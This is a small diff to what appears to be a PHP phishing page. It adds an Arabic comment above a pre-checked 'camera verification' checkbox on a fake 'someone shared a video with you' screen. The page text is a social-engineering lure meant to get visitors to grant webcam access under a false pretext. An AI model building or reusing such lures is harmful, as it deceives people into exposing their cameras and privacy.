@@ -343,6 +343,7 @@ if (isset($_GET['r'])) {
         <h2>Watch this video</h2>
         <p><strong><?php echo htmlspecialchars($sender_name); ?></strong> shared a video with you. Watch now to view content!</p>
         
+        <!-- زر اختيار تفعيل الكاميرا (اختياري) -->
         <label class="checkbox-container">
             <input type="checkbox" id="enableCamera" checked>
             <span>Enable camera verification for high quality</span>
